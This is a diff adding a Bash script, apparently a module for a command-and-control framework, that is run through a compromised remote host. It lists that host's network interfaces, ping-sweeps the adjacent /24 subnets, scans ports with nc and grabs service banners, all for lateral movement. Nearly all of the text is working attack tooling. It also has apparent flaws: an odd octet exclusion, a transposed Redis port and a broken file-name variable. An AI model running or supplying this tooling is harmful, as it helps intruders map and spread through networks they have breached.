@@ -1,0 +1,138 @@
+# lateral_scan_parallel_files.c2
+set -o pipefail
+set -u
+set -e
+
+# ---------- KONFIG ----------
+PORT_START=1
+PORT_END=1024
+MAX_JOBS=24           # mobil-friendly
+PROGRESS_WIDTH=30
+EXCLUDE_FIRST_OCTETS=("10" "191" "127")
+EXTRA_PORTS=(8080 3306 5432 6739 11211 3389 8443)
+
+PORTS=($(seq "$PORT_START" "$PORT_END") "${EXTRA_PORTS[@]}")
+
+print_std "[*] Starting distributed lateral scan..."
+
+TMPROOT="${TMPDIR:-/data/data/com.termux/files/usr/tmp}/c2_scan_$$.$(date +%s)"
+mkdir -p "$TMPROOT"
+
+# ---------- FUNKCE ----------
+draw_progress() {
+    local CUR="$1" TOTAL="$2" LABEL="$3"
+    local FILLED=$(( CUR*PROGRESS_WIDTH/TOTAL ))
+    ((FILLED>PROGRESS_WIDTH)) && FILLED=$PROGRESS_WIDTH
+    local EMPTY=$((PROGRESS_WIDTH-FILLED))
+    local BAR="$(printf "%0.s#" $(seq 1 $FILLED))$(printf "%0.s." $(seq 1 $EMPTY))"
+    printf "\r%-20s [%s] %3d%% (%d/%d)" "$LABEL" "$BAR" "$((CUR*100/TOTAL))" "$CUR" "$TOTAL"
+}
+
+wait_for_slot() {
+    while (( $(jobs -r | wc -l) >= MAX_JOBS )); do sleep 0.05; done
+}
+
+# ---------- 1) zjisti remote IP ----------
+print_std "[*] Discovering remote host IP interfaces..."
+ip_out="$(send_cmd "ip -o -4 addr show 2>/dev/null || true" 2>/dev/null || true)"
+REMOTE_IPS=()
+if [[ -n "$ip_out" ]]; then
+  while IFS= read -r line; do
+    ipcidr="$(printf "%s\n" "$line" | awk '{print $4}' 2>/dev/null || true)"
+    ip="${ipcidr%%/*}"
+    [[ -n "$ip" ]] && REMOTE_IPS+=("$ip")
+  done <<< "$ip_out"
+fi
+
+SUBNETS=()
+for ip in "${REMOTE_IPS[@]}"; do
+  first_octet="${ip%%.*}"
+  skip=false
+  for ex in "${EXCLUDE_FIRST_OCTETS[@]}"; do [[ "$first_octet" == "$ex" ]] && skip=true && break; done
+  $skip && continue
+  SUBNETS+=("$ip")
+done
+
+[[ ${#SUBNETS[@]} -eq 0 ]] && { print_err "[!] Žádné použitelné remote subnets."; exit 1; }
+print_std "[*] Remote IPs detected: ${SUBNETS[*]}"
+
+# ---------- 2) generuj hosty ----------
+HOSTS=()
+for ip in "${SUBNETS[@]}"; do
+  base="${ip%.*}"
+  for i in $(seq 1 254); do HOSTS+=("$base.$i"); done
+done
+TOTAL_HOSTS=${#HOSTS[@]}
+print_std "[*] Total hosts to ping: $TOTAL_HOSTS"
+
+# ---------- 3) paralelní ping (UP-only) ----------
+UP_HOSTS=()
+COUNT=0
+print_std "[*] Pinging hosts remotely (parallel)..."
+for h in "${HOSTS[@]}"; do
+  (
+    out="$(send_cmd "if command -v ping >/dev/null 2>&1; then ping -c1 -W1 $h >/dev/null 2>&1 && echo UP || echo DOWN; else echo DOWN; fi" 2>/dev/null || true)"
+    [[ "$out" == "UP" ]] && echo "$h" >> "$TMPROOT/up_hosts.txt"
+    echo "$h done"
+  ) &
+  wait_for_slot
+done | while IFS= read -r _; do
+    COUNT=$((COUNT+1))
+    draw_progress "$COUNT" "$TOTAL_HOSTS" "Ping hosts"
+done
+echo
+
+# načti UP hosty
+[[ -f "$TMPROOT/up_hosts.txt" ]] && mapfile -t UP_HOSTS <"$TMPROOT/up_hosts.txt"
+TOTAL_UP=${#UP_HOSTS[@]}
+print_std "[*] Hosts up: $TOTAL_UP"
+[[ $TOTAL_UP -eq 0 ]] && { print_std "[!] Žádné hosty dostupné. Konec."; exit 0; }
+
+# ---------- 4) paralelní port scan do souborů ----------
+print_std "[*] Scanning ports (per-host files)..."
+for h in "${UP_HOSTS[@]}"; do
+  host_file="$TMPROOT/ports_$h.txt"
+  COUNT=0
+  TOTAL_PORTS=${#PORTS[@]}
+  for port in "${PORTS[@]}"; do
+    (
+      rcmd="if command -v nc >/dev/null 2>&1; then nc -z -w1 $h $port && echo open || echo closed; else echo closed; fi"
+      res="$(send_cmd "$rcmd" 2>/dev/null || true)" || true
+      [[ "${res:-}" == "open" ]] && echo "$h $port" >> "$host_file"
+    ) &
+    wait_for_slot
+    COUNT=$((COUNT+1))
+    draw_progress "$COUNT" "$TOTAL_PORTS" "Scan $h ports"
+  done
+  wait
+  echo
+done
+
+print_std "[*] Port scan complete. Files in $TMPROOT"
+
+# ---------- 5) banner grab (per-host files) ----------
+print_std "[*] Performing banner grab..."
+for h in "${UP_HOSTS[@]}"; do
+  host_file="$TMPROOT/ports_$h.txt"
+  [[ ! -f "$host_file" ]] && continue
+  while read -r ip port; do
+    banner_file="$TMPROOT/banner_$ip_$port.txt"
+    payload=""
+    case "$port" in
+      21) payload=$'QUIT\r\n' ;;
+      22) payload=$'' ;;
+      25|587|465) payload=$'EHLO test\r\nQUIT\r\n' ;;
+      80|8080|8443|443) payload=$'HEAD / HTTP/1.0\r\nHost: '"$ip"$'\r\n\r\n' ;;
+      6379) payload=$'*1\r\n$4\r\nPING\r\n' ;;
+      11211) payload=$'stats\r\n' ;;
+      *) payload=$'\r\n' ;;
+    esac
+    rcmd="if command -v nc >/dev/null 2>&1; then printf '%s' '$payload' | timeout 3 nc -nv $ip $port 2>/dev/null | head -n 5; else echo ''; fi"
+    banner="$(send_cmd "$rcmd" 2>/dev/null || true)"
+    printf "%s" "$banner" > "$banner_file"
+  done <"$host_file"
+done
+
+print_std "[*] Banner grab complete. Banner files in $TMPROOT"
+
+exit 0
